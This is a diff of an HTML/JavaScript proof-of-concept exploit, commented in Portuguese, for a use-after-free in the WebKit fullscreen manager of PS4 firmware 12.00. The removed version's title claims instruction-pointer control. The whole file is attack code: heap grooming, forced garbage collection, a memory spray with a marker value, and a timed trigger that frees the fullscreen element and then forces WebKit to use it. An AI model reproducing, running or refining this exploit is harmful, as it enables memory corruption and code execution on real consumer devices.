@@ -2,55 +2,59 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 WebKit UAF - RIP Control PoC v2</title>
-<style>
-    body { background-color: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
-    button { padding: 20px; font-size: 18px; font-weight: bold; background-color: #cc0000; color: white; border: none; cursor: pointer; }
-    #log { margin-top: 20px; font-size: 16px; color: #ffcc00; }
-</style>
+<title>PS4 UAF - Gatilho Cirúrgico</title>
 </head>
-<body>
+<body style="background-color: #222; color: #fff;">
 
-<h2>WebKit FullscreenManager UAF (Firmware 12.00)</h2>
-<button onclick="triggerPoC()">Iniciar Exploração (Pressione OPTIONS depois)</button>
-<div id="log">Aguardando início...</div>
+<h2>PS4 12.00 - UAF Confirmation (Teste Cirúrgico do Fullscreen)</h2>
+
+<button onclick="runTest()" style="padding: 10px; font-size: 16px;">Executar Teste: Destruição do Alvo</button>
+
+<div id="log"></div>
 
 <script>
-const PATTERN = 2.121995791e-314; 
+const PATTERN = 2.121995791e-314;
 
-function triggerPoC() {
+function runTest() {
     const log = document.getElementById("log");
-    log.innerHTML = "Preparando a memória...<br><b>Pressione OPTIONS agora!</b>";
+    log.innerHTML = "<p>Running... Press OPTIONS</p>";
 
     let controllers = [];
 
-    // [1] Heap Grooming: Alocação inicial
+    // Passo 1: Alocação (Heap Grooming)
     for(let i = 0; i < 5000; i++) {
         let arr = new Float64Array(8);
         arr[0] = i;
         controllers.push(arr);
     }
 
-    // [2] Criação do Alvo do Fullscreen
+    // Criação do alvo do Fullscreen em vez de usar o documentElement
     let fsTarget = document.createElement("div");
-    fsTarget.style.cssText = "position:absolute; top:0; left:0; width:100%; height:100%; background:black;";
-    fsTarget.innerHTML = "<h2 style='color:white; margin-top: 20%;'>Tela Cheia.<br>Aperte OPTIONS.</h2>";
+    fsTarget.innerHTML = "<h1 style='color: white; margin-top: 20%; text-align: center;'>Tela Cheia Ativa<br>Pressione OPTIONS agora</h1>";
+    fsTarget.style.backgroundColor = "black";
+    fsTarget.style.width = "100%";
+    fsTarget.style.height = "100%";
+    fsTarget.style.position = "absolute";
+    fsTarget.style.top = "0";
+    fsTarget.style.left = "0";
     document.body.appendChild(fsTarget);
 
+    // Entra em Fullscreen usando o nosso alvo específico
     if (fsTarget.webkitRequestFullscreen) {
         fsTarget.webkitRequestFullscreen();
+    } else {
+        document.documentElement.webkitRequestFullscreen?.();
     }
 
     window.onblur = function() {
-        log.innerHTML += "<br>Evento onblur disparado. Limpando Heap...";
-
-        // [3] Força GC (Libera as alocações iniciais)
+        // FORÇA GC
         controllers = null;
+
         for (let i = 0; i < 20000; i++) {
             new ArrayBuffer(0x10000);
         }
 
-        // [4] Spray (Gera pressão no Heap ANTES da destruição)
+        // Spray mantido (Essencial para sobrescrever o objeto C++ deletado)
         let spray = [];
         for(let i = 0; i < 8000; i++) {
             let p = new Float64Array(10);
@@ -58,23 +62,23 @@ function triggerPoC() {
             spray.push(p);
         }
 
-        // [5] O Gatilho Crítico (Síncrono)
+        // Gatilho crítico Cirúrgico
         setTimeout(() => {
-            log.innerHTML += "<br>Engatilhando vulnerabilidade (Free + Use)...";
-            
             try {
-                // Removemos o alvo (FREE)
+                // 1. Destruímos apenas o elemento hospedeiro da tela cheia!
                 fsTarget.remove(); 
                 
-                // Imediatamente forçamos a API de Fullscreen a interagir com o ponteiro recém-deletado (USE)
+                // 2. Forçamos o WebKit a tentar resolver a saída da tela cheia agora que o elemento sumiu.
                 if (document.webkitIsFullScreen || document.fullscreenElement) {
                     document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
                 }
             } catch(e) {
-                console.log("[Erro no Gatilho]", e);
+                console.log("[ERRO NO GATILHO]", e);
             }
-            
-        }, 3000); // 3 segundos foi o tempo ideal no seu teste de sucesso
+
+            // O fallback que ajuda a engatilhar a destruição caso o exitFullscreen apenas enfileire a tarefa
+            setTimeout(() => location.reload(), 500);
+        }, 3000);
     };
 }
 </script>
